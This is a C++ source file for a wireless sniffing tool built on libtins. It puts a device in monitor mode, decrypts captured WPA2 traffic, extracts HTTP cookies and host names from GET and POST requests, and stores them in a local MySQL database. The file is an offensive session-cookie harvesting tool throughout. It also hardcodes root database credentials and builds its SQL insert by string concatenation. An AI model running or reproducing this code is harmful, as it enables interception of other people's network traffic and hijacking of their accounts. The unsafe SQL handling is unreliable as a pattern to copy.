#include <iostream>
#include <tins/tins.h>
#include <thread>
#include <algorithm>
#include <mutex>

#include "sniffclass.h"
#include "sqlmagician.h"
#include "printdata.h"
#include "regexmagician.h"

using namespace std;
using namespace Tins;

void usage()
{
    cout<<"Usage : ./Program <Monitor Mode Dev> "<<endl;
}
bool checkArgc(int argc)
{
    if(argc!=2)
    {
        usage();
        return false;
    }
    return true;
}
bool parseCookies(PDU& pdu);
int main(int argc, char* argv[])
{
    if(!checkArgc(argc))
        exit(0);

    char* monitorDev=argv[1];

    //Declaration AP Sniffer
    APSniffer apSniffer(monitorDev);
    //Run AP Sniffer
    thread apParser(&APSniffer::run,&apSniffer);

    sleep(5);
    //Declaration WPA2Sniffer
    Wpa2Sniffer wpa2Sniffer(monitorDev,parseCookies);
    thread decryptInfoReciver(&APSniffer::decryptProxyAdder,&apSniffer,ref(wpa2Sniffer));

    //waiting for init
    while(wpa2Sniffer.getPasswd()==""&&wpa2Sniffer.getSsid()=="");

    //CookieParser(Wpa2Decrytor run in Backgrorund) run
    thread cookieParser(&Wpa2Sniffer::run,&wpa2Sniffer);
    //after then First DecryptInfoReciver.Add
    apParser.join();
    cookieParser.join();
    decryptInfoReciver.detach();
    cout<<"***************************************Program was down***************************************"<<endl;
    return 0;
}


bool parseCookies(PDU& pdu)
{

    //Database Setting up
    static SqlMagician sqlMagition("tcp://localhost:3306","root","toor","CCIT");
    static RegexMagician regexMagition;

    const TCP& tcp= pdu.rfind_pdu<TCP>();

    //parse Http Packet
    if(tcp.sport()!=80&&tcp.dport()!=80) return true;

    const RawPDU& rawPDU = pdu.rfind_pdu<RawPDU>();

    if(rawPDU.payload_size()>=4)
    {

        //parsing http get or post
        if((strncmp((char*)rawPDU.payload().data(),"GET ",4)!=0&&(strncmp((char*)rawPDU.payload().data(),"POST ",5))!=0)) return true;

        bool flag=false;

        string cookie=regexMagition.findCookie((char*)rawPDU.payload().data(),rawPDU.payload_size(),flag);
        if(flag) //if find cookie
        {
            //find host
            string host=regexMagition.findHost((char*)rawPDU.payload().data(),rawPDU.payload_size(),flag);
            if(flag==true&&host.find("ahnlab")==string::npos) //skip ahnlab cookies
            {
                std::replace(cookie.begin(),cookie.end(),'\"','\'');
                sqlMagition.insertSql("Cookie",'\"'+host+"\", \""+cookie+"\", \"\"");
            }

        }
    }

    return true;
}

